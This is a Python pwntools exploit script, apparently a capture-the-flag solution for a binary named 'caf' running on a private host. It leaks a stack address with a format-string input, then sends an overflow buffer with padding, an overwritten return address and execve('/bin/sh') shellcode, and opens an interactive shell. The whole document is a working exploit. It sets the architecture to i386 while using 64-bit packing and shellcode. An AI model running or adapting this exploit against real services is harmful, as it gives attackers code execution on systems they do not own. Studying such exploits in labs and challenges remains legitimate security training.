#!/usr/bin/env python3

from pwn import *
context(arch='i386', os='linux')

def main():
    print(f"Lets pwn CAF")
    #p = process("./caf")
    p=remote("172.16.150.8",1337)
    input(f"Press ENTER after attach debug")

    p.recv(1024)
    p.sendline("%p,%p,%p")

    # addresss of stack leaked
    leak=p.recv(1024)
    leak=leak.decode().split("\n")[0].split(",")[1]
    leak=int(leak,16)
    print(f"leak address: {leak}")

    # padding to get bof
    # 
    # 264 a's + RIP + shellcode 
    # RIP points to begginner of shellcode

    total_padding_lenght = 264
    start_buf=(leak-9)  # address of our first input

    padding = b"C" * total_padding_lenght
    RIP=p64(start_buf+len(padding)+8)
    shellcode =b"\x90" * 16

    # /bin/sh
    shellcode += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    shellcode += b"\x90" * 32
    # join all 
    buffer=padding + RIP + shellcode

    # send evil buffer
    p.sendline(buffer)
    p.interactive()

if __name__ == '__main__':
    main()

